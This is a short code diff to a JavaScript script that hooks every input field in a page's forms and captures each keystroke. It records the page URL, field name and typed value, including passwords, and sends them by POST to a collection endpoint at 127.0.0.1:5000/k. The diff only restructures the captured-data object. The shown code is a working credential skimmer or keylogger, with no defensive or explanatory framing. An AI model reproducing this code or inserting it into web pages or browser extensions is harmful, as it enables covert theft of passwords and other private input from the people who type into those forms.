@@ -32,10 +32,9 @@ for (var i = 0; i < document.forms.length; i++) {
 		var x = "";
         inps[j].addEventListener("input", function() {
 			var logindata = {};
-			logindata["password"] = {};
-			logindata["password"]["url"] = document.URL;
-			logindata["password"]["fieldname"] = this.name;
-			logindata["password"]["fieldvalue"] = this.value;
+			logindata["url"] = document.URL;
+			logindata["fieldname"] = this.name;
+			logindata["fieldvalue"] = this.value;
             fetch('http://127.0.0.1:5000/k',
             {
             method: "POST",
